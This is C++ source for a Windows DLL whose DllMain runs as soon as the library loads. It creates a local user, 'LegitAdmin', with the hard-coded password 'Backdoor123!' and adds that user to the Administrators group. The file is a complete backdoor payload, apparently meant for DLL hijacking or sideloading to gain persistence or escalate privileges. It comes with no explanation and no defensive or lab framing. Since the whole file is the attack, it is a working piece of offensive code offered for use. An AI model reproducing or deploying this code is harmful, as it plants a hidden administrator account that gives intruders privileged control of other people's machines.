#include <iostream>
#include <windows.h>
#include <LM.h>
#pragma comment(lib,"Netapi32.lib")
using namespace std;
wstring name = L"LegitAdmin";
LPWSTR lpName = const_cast<wchar_t*>(name.c_str());
wstring password = L"Backdoor123!";
LPWSTR lpPassword = const_cast<wchar_t*>(password.c_str());
DWORD adduserStatus = -1;
wstring adminGroup = L"Administrators";
USER_INFO_1 userinfo;



int backDoor(USER_INFO_1 userinfo){
    userinfo.usri1_name = lpName;
    userinfo.usri1_password = lpPassword;
    userinfo.usri1_password_age = 0;
    userinfo.usri1_priv = USER_PRIV_USER;
    userinfo.usri1_home_dir = NULL;
    userinfo.usri1_comment = NULL;
    userinfo.usri1_flags = UF_NORMAL_ACCOUNT;
    userinfo.usri1_script_path = NULL;
    _LOCALGROUP_MEMBERS_INFO_3 localgroupinfo;
    localgroupinfo.lgrmi3_domainandname = lpName;
    NetUserAdd(NULL, 1, (LPBYTE)&userinfo, &adduserStatus);
    if (adduserStatus)
    {
        return adduserStatus;
    }
    NetLocalGroupAddMembers(NULL, adminGroup.c_str(),3,(LPBYTE)&localgroupinfo,1);
    if (adduserStatus)
    {
        return adduserStatus;
    }

    return 0;
    
};

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        adduserStatus = backDoor(userinfo);
        break;
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

